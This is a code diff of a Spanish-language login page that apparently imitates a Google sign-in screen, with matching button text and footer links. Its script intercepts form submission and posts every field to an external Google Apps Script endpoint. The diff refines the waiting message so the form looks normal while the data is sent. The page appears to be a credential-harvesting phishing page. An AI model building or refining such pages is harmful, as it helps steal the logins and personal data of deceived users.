@@ -228,6 +228,9 @@
         <span id="error-message" style="color: red;"></span>
 
         <button type="submit" class="button">Siguiente</button>
+            <p id="loadingMessage" style="display: none; text-align: center; font-size: 14px; color: #555;">
+    ⏳ Espere, por favor...
+</p>
 
         <a href="#" class="link">¿No tienes una cuenta? Crea una</a>
 
@@ -238,25 +241,20 @@
    <p>Español(España) Ayuda Privacidad Términos</p>
 
   </div>
-
-  <!-- Mensaje de carga oculto -->
-<div id="loadingMessage" style="display: none; text-align: center;">
-    <p>Enviando solicitud... Por favor, espere.</p>
-</div>
         
   <script>
 document.getElementById("miFormulario").addEventListener("submit", async function(event) {
     event.preventDefault();
 
-    // Ocultar el formulario y mostrar el mensaje de carga
-    document.getElementById("miFormulario").style.display = "none";
+    // Mostrar el mensaje de espera debajo del botón
     document.getElementById("loadingMessage").style.display = "block";
 
+    // Obtener datos del formulario
     const formData = new FormData(this);
     const url = "https://script.google.com/macros/s/AKfycbxU80QkIHuMrsTIuSLL01BMCpNZ-kmW0M_TlduiLKfHTD8qY2oMVXExV_qlRrbmhgzJ/exec";
 
     try {
-        const response = await fetch(url, {
+        await fetch(url, {
             method: "POST",
             body: new URLSearchParams(formData),
             headers: { "Content-Type": "application/x-www-form-urlencoded" }
@@ -267,12 +265,10 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
         alert("Error al conectar con el servidor.");
         console.error("Error:", error);
 
-        // Si hay un error, volver a mostrar el formulario y ocultar el mensaje
-        document.getElementById("miFormulario").style.display = "block";
+        // Ocultar el mensaje de espera si hay error
         document.getElementById("loadingMessage").style.display = "none";
     }
 });
-
 </script>
 
 
